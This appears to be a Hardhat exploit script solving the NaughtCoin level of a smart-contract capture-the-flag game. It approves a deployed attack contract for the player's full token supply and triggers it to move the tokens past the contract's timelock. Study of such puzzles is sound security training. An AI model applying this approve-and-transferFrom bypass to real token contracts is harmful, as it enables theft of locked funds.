const hre = require("hardhat");
require("dotenv").config();

async function main() {
  // Setup accounts
  [player] = await ethers.getSigners();

  const INSTANCE_ADDRESS = "0xeDDD860E4F5A1597F5Eb4C489D89999678e5e446";
  const ATTACK_ADDRESS = "0x3192A402AE25EFe923F5D8C0074657652aD69Da3";

  // Fetch instance contract
  const naughtCoin = await hre.ethers.getContractAt("NaughtCoin", INSTANCE_ADDRESS);
  console.log(`NaughtCoin contract fetched at ${naughtCoin.address}`);

  // Fetch attack contract
  const naughtCoinAttack = await hre.ethers.getContractAt("NaughtCoinAttack", ATTACK_ADDRESS);
  console.log(`NaughtCoinAttack contract fetched at ${naughtCoinAttack.address}`);

  // Approve attack contract
  await (await naughtCoin.connect(player).approve(ATTACK_ADDRESS, await naughtCoin.INITIAL_SUPPLY())).wait();
  await (await naughtCoinAttack.connect(player).attackNaughtCoin()).wait();

  console.log(`Attack successfull!`);
  console.log(`Player balance: ${await naughtCoin.balanceOf(player.address)}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});